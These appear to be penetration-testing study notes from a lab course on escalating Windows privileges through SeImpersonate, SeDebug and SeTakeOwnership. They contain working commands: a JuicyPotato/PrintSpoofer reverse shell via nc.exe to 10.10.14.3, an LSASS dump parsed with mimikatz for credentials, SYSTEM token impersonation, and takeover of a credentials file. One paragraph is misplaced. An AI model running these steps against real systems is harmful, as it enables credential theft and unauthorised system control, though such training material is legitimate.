# Windows User Privileges

Security principals are the primary way of controlling access to resources on Windows hosts. Every single security principal is identified by a unique [Security Identifier (SID)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows). When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.

## **SeImpersonate and SeAssignPrimaryToken**

SeImpersonatePrivilege is **a Windows security setting that is assigned by default to the device's local Administrators group and the Local Service account**. The role is to determine which programs are allowed to impersonate a user or other specified account and perform actions on behalf of the user

*   `whoami /priv`

    if runnign whoami /priv lists `SeImpersonatePrivilege` or **`SeAssignPrimaryToken`**, we can use this privilege to impersonate a privileged account such as `NT AUTHORITY\\SYSTEM`

#### **JuicyPotato**

For this juicy potato can be used to exploit he `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

* `nc -lnvp 8443` → setup netcat listener
*   `c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`

    `-l` is the COM server listening port,

    `-p` is the program to launch (cmd.exe),

    `-a` is the argument passed to cmd.exe, and

    `-t` is the `createprocess` call.

    Above, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

JuicyPotato does not work on Windows Server 2019 and Windows 10 build 1809 onwards

#### **PrintSpoofer and RoguePotato**

* `c:\\tools\\PrintSpoofer.exe -c "c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd"` → using printspoofer

## **SeDebugPrivilege**

SeDebugPrivilege can be used to capture sensitive information from system memory, or access/modify kernel and application structures.

This right may be assigned to developers who need to debug new system components as part of their day-to-day job

```
C:\\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

we can see SeDebugPrivilege is Listed.

*   `C:\\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp` → we can dump LSAAS process, which stores user creds after login to the system

    procdump.exe is available from SysInternals suite

```
C:\\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \\ / ##       > <https://blog.gentilkiwi.com/mimikatz>
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > <https://pingcastle.com> / <https://mysmartlogon.com> ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP>

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
```

Then we can use mimikatz to import those dump file and get the NTLM hash

we are using `log` on mimikatz to save output to txt file

**`SeDebugPrivilege can be used to get RCE as SYSTEM`**

Our idea here is to get elevate our privilege to SYSTEM by launching a Child Process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of parent process.

* `PS C:\\htb> tasklist`→ get the PID of process running as SYSTEM (run command on elevated powershell)

then we will use this tool [https://github.com/decoder-it/psgetsystem](https://github.com/decoder-it/psgetsystem)

```
PS> . .\\psgetsys.ps1

PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>

```

* `ImpersonateFromParentPid -ppid 612 -command "C:\\Windows\\System32\\cmd.exe" -cmdargs <command arguments>`

## **SeTakeOwnershipPrivilege**

[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes

The role is to determine which programs are allowed to impersonate a user or other specified account and perform actions on behalf of the user

```powershell
PS C:\\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

We see the privilege is disabled, we can enabled it using this script [https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

```powershell
PS C:\\htb> Import-Module .\\Enable-Privilege.ps1
PS C:\\htb> .\\EnableAllTokenPrivs.ps1
PS C:\\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Next, choose a target file and confirm the current ownership.

Let's check out our target file to gather a bit more information about it.

```powershell
PS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\\Department Shares\\Private\\IT\\cred.txt 6/18/2021 12:23:28 PM    Archive
```

#### Checking File ownership

```powershell
PS C:\\htb> cmd /c dir /q 'C:\\Department Shares\\Private\\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\\Department Shares\\Private\\IT

06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

#### **Taking Ownership of the File**

```powershell
PS C:\\htb> takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'

SUCCESS: The file (or folder): "C:\\Department Shares\\Private\\IT\\cred.txt" now owned by user "WINLPE-SRV01\\htb-student".
```

#### **Confirming Ownership Changed**

```powershell
PS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\\Department Shares\\Private\\IT WINLPE-SRV01\\htb-student
```

we may still not be able to read the file and need to modify the ACL using icacls

```powershell
PS C:\\htb> icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F

processed file: C:\\Department Shares\\Private\\IT\\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

Now we have access to targeted file.
